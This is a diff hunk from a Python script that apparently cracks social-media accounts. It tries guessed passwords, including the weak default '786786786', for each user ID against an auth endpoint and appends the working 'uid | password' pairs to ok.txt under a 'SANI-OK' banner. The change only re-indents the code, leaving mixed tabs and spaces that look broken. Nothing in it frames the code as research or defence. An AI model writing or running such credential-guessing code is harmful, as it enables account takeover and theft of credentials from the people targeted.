@@ -419,22 +419,22 @@ def b_menu_select():
 		                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers = header).text
                                                 q = json.loads(data)
 		    	                        if 'loc' in q:
-		                                     print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass8+" | "+name)
-		                                     ok=open("ok.txt","a")
-		                                     ok.write(uid+" | "+pass8+"\n")
-		                                     ok.close()
-		                                     oks.append(uid + pass8)
-		                                 else:
-		                                     pass9="786786786"
-		                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers = header).text
-                                                     q = json.loads(data)
-		                                     if 'loc' in q:
-		                                         print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass9+" | "+name)
-		                                         ok=open("ok.txt","a")
-		                                         ok.write(uid+" | "+pass9+"\n")
-		                                         ok.close()
-		                                         oks.append(uid + pass9)
-															
+		                                    print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass8+" | "+name)
+		                                    ok=open("ok.txt","a")
+		                                    ok.write(uid+" | "+pass8+"\n")
+		                                    ok.close()
+		                                    oks.append(uid + pass8)
+						else:
+		                                    pass9="786786786"
+		                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers = header).text
+                                                    q = json.loads(data)
+		                                    if 'loc' in q:
+		                                        print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass9+" | "+name)
+		                                        ok=open("ok.txt","a")
+		                                        ok.write(uid+" | "+pass9+"\n")
+		                                        ok.close()
+		                                        oks.append(uid + pass9)
+		              											
 		except:
 			pass
 		
